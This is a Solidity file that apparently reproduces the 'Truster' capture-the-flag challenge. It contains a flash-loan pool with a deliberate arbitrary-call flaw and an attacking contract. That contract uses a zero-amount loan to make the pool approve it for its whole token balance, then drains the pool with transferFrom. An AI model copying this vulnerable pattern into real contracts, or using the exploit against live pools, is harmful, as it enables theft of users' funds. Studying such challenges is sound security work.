// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Ownable2Step} from "@openzeppelin/contracts/access/Ownable2Step.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";
import {ERC20} from "@solmate/src/tokens/ERC20.sol";
import {Test, console} from "forge-std/Test.sol";

contract DamnValuableToken is ERC20 {
    constructor() ERC20("DamnValuableToken", "DVT", 18) {
        _mint(msg.sender, type(uint256).max);
    }
}

contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = ERC20(token).balanceOf(address(this));

        ERC20(token).transfer(borrower, amount);

        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
}

contract Target is Ownable2Step {
    TrusterLenderPool private immutable lender;
    address private immutable token;

    uint256 private constant POOL_BALANCE = 1_000_000e18;

    error NotLender(address lender);

    constructor(TrusterLenderPool _lender, address _token) Ownable(msg.sender) {
        lender = _lender;
        token = _token;
    }

    modifier onlyLender() {
        if (msg.sender != address(lender)) {
            revert NotLender(msg.sender);
        }
        _;
    }

    function getFlashLoan() external onlyOwner {
        lender.flashLoan(
            0,
            address(this),
            address(token),
            abi.encodeWithSignature("approve(address,uint256)", address(this), POOL_BALANCE)
        );

        ERC20(token).transferFrom(address(lender), address(this), POOL_BALANCE);
    }
}
